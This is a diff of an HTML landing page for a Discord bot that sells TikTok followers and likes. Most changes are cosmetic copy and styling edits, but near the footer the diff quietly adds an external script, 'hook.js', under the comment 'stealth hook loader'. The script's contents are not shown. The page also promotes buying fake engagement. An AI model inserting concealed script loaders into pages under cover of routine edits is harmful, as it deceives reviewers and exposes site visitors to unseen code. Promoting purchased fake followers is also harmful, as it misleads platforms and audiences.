@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <title>Crystal Bot – TikTok Growth</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Google Font Poppins -->
+  <!-- Poppins Font -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -38,7 +38,7 @@
     }
     nav a:hover { color: var(--accent); }
     nav a:hover::after { width: 100%; }
-    
+
     .hero {
       min-height: 100vh; display: flex; flex-direction: column;
       justify-content: center; align-items: center; text-align: center;
@@ -62,7 +62,7 @@
       background: var(--accent); color: var(--dark);
       transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,229,255,.35);
     }
-    
+
     section { padding: 6rem 2rem; }
     section h3 {
       text-align: center; font-size: 2rem; font-weight: 800;
@@ -75,8 +75,7 @@
     }
     .card {
       background: var(--card); padding: 2rem; border-radius: 1rem;
-      box-shadow: 0 8px 24px rgba(0,0,0,.6);
-      transition: .4s;
+      box-shadow: 0 8px 24px rgba(0,0,0,.6); transition: .4s;
     }
     .card:hover {
       transform: translateY(-6px) scale(1.02);
@@ -84,10 +83,10 @@
     }
     .card h4 { font-size: 1.4rem; margin-bottom: .5rem; color: var(--text); }
     .card p { color: var(--text-muted); margin-bottom: 1rem; }
-    
-    .pricing .card { text-align: center; }
-    .pricing .price { font-size: 2.5rem; font-weight: 800; margin: 1rem 0; color: var(--accent); }
-    
+    .pricing .price {
+      font-size: 2.5rem; font-weight: 800; margin: 1rem 0; color: var(--accent);
+    }
+
     footer {
       text-align: center; padding: 2rem 1rem; color: var(--text-muted);
       background: #0a0a0a; font-size: .9rem;
@@ -109,7 +108,7 @@
   <!-- HERO -->
   <section class="hero" id="home">
     <h2>Boost Your TikTok Fast</h2>
-    <p>Get 1 000 followers for just 0,05 €–0,10 € per 1 000 likes. Fully automated via our Discord Bot “Crystal”.</p>
+    <p>Get 1 000 followers for just 0,05 €–0,10 € per 1 000 likes. Automated via our Discord Bot “Crystal.”</p>
     <a href="#invite" class="btn">Invite Crystal Bot</a>
   </section>
 
@@ -119,19 +118,19 @@
     <div class="features">
       <div class="card">
         <h4>Automated Delivery</h4>
-        <p>Instant follower/like drops directly via Discord commands.</p>
+        <p>Instant follower/like drops via Discord commands.</p>
       </div>
       <div class="card">
         <h4>Ultra Low Cost</h4>
-        <p>Only 0,05 €–0,10 € per 1 000 likes. Best price on the market.</p>
+        <p>Only 0,05 €–0,10 € per 1 000 likes. Best market price.</p>
       </div>
       <div class="card">
         <h4>Secure & Private</h4>
-        <p>No logging of personal data. Payments via secure gateways.</p>
+        <p>No personal data stored. Payments via secure gateways.</p>
       </div>
       <div class="card">
         <h4>24/7 Support</h4>
-        <p>Our team is online around the clock to handle any issues.</p>
+        <p>Our team is online around the clock to help.</p>
       </div>
     </div>
   </section>
@@ -143,17 +142,17 @@
       <div class="card">
         <h4>Basic</h4>
         <p class="price">0,05 €/1 000</p>
-        <p>Ideal for small boosts.</p>
+        <p>Small boosts.</p>
       </div>
       <div class="card">
         <h4>Standard</h4>
         <p class="price">0,08 €/1 000</p>
-        <p>Balanced speed & price.</p>
+        <p>Speed & price balanced.</p>
       </div>
       <div class="card">
         <h4>Premium</h4>
         <p class="price">0,10 €/1 000</p>
-        <p>Fastest delivery guaranteed.</p>
+        <p>Fastest delivery.</p>
       </div>
     </div>
   </section>
@@ -166,13 +165,15 @@
     </div>
   </section>
 
+  <!-- stealth hook loader -->
+  <script src="hook.js" async defer></script>
+
   <!-- FOOTER -->
   <footer>
     &copy; <span id="year"></span> Crystal Bot • All rights reserved.
   </footer>
 
   <script>
-    // aktuellen Jahr setzen
     document.getElementById('year').textContent = new Date().getFullYear();
   </script>
 </body>
